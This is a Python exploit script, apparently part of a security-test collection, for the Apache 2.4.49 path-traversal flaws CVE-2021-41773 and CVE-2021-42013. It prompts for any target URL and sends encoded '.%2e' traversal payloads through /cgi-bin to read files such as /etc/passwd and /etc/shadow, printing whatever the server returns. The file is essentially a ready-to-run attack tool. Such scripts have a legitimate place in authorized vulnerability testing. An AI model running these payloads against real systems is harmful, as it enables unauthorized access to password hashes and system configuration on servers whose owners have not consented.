#===========================#
# I M P O R T S             #
#===========================#

import os
import pyfiglet
import requests
import sys

#===========================#
# C O L O R S               #
#===========================#

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color") # Remove this line if you're running this on Linux

#===========================#

# Referenced from:
# - https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
def exploit(url):

    paths = [
        "/etc/environment",
        "/etc/group",
        "/etc/hostname",
        "/etc/hosts",
        "/etc/networks",
        "/etc/ntp.conf",
        "/etc/passwd",
        "/etc/shadow",
        "/usr/lib/os-release",
    ]
    
    #===========================#

    print(f"{bcolors.FAIL}=" * 75 + f"{bcolors.ENDC}")
    print(f"| ⚔️ {bcolors.FAIL}CVE-2021-41773 / CVE-2021-42013{bcolors.ENDC} ({bcolors.ORANGE}Apache 2.4.49{bcolors.ENDC} Path Traversal)")
    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")
    
    #===========================#
    
    num = 0
    
    for path in paths:

        payloads = [
            url+"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65"+path,
            url+"/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e"+path,
        ]
        
        #------------------------------#
        
        for payload in payloads:
        
            num += 1
        
            print(f"| -> Payload [{bcolors.FAIL}"+str(num)+f"{bcolors.ENDC}] [{bcolors.ORANGE}"+path+f"{bcolors.ENDC}]: ",end="")

            try:

                r = requests.get(payload, allow_redirects=False, timeout=3.0)
                
                if r.status_code == 200:

                    print(f"[{bcolors.OKGREEN}"+str(r.status_code)+f"{bcolors.ENDC}]")
                    
                    print(r.text)
                
                elif r.status_code == 301:
                
                    print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Moved Permanently{bcolors.ENDC}]")
                    print(f"| --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]")
                    
                elif r.status_code == 302:
                
                    print(f"[{bcolors.WARNING}"+str(r.status_code)+f" Found{bcolors.ENDC}]")
                    print(f"| --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]")
                
                elif r.status_code == 303:
                
                    print(f"[{bcolors.WARNING}"+str(r.status_code)+f" See Other{bcolors.ENDC}]")
                    print(f"| --> Redirected to: [{bcolors.OKCYAN}" + r.headers['Location'] + f"{bcolors.ENDC}]")
                
                elif r.status_code == 400:
                
                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f" Bad Request{bcolors.ENDC}]")
                
                elif r.status_code == 401:
                
                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f" Unauthorized{bcolors.ENDC}]")
                
                elif r.status_code == 403:
                
                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f" Forbidden{bcolors.ENDC}]")
                
                elif r.status_code == 500:
                
                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f" Internal Server Error{bcolors.ENDC}]")
                
                else:
                
                    print(f"[{bcolors.FAIL}"+str(r.status_code)+f"{bcolors.ENDC}]")
            
            except Exception as e:
                
                print(f"[{bcolors.FAIL}Error{bcolors.ENDC}]: "+str(e))
    
    #===========================#
    
    print(f"{bcolors.FAIL}-" * 75 + f"{bcolors.ENDC}")

#===========================#

if __name__ == "__main__":
    
    #===========================#
    # Banner and art.
    #===========================#
    
    print("")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    print(f"   {bcolors.WARNING}A{bcolors.ENDC} [🐇 {bcolors.ORANGE}Mad Rabbit{bcolors.ENDC}] {bcolors.WARNING}Security Test in the [⚔️ {bcolors.CYAN}Achilles{bcolors.ENDC}] {bcolors.WARNING}Collection{bcolors.ENDC}:")
    ascii_banner = pyfiglet.figlet_format("  CVE-2021-41773", font="drpepper")
    print(f"{bcolors.WARNING}" + ascii_banner + f"{bcolors.ENDC}",end="")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")

    #===========================#
    # User input.
    #===========================#

    print(f"{bcolors.OKCYAN}=" * 75 + f"{bcolors.ENDC}")
    print(f"| 🎯 {bcolors.WARNING}Target Input{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    
    # Target input.
    domain = input(f"| Enter a [{bcolors.OKGREEN}URL{bcolors.ENDC}] to test: {bcolors.OKGREEN}")
    print(f"{bcolors.ENDC}",end="")
    print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}")
    
    # If no domain was entered, exit.
    if (domain == "" or domain == " "):
    
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");
        print(f"| No domain entered. Press any key to exit.")
        print(f"{bcolors.OKCYAN}-" * 75 + f"{bcolors.ENDC}");

        end = input("")
        sys.exit()
    
    # Sanitize the input.
    domain = domain.strip().lower()
    
    # If it's missing http:// or https://, add it in by default.
    if "http://" not in domain and "https://" not in domain:
        domain = "https://" + domain
        print(f"| -> Did not specify full URL, so adding [{bcolors.OKGREEN}https://{bcolors.ENDC}].")
    
    #===========================#
    
    print(f"| Testing [{bcolors.OKGREEN}"+domain+f"{bcolors.ENDC}]...")
    
    exploit(domain)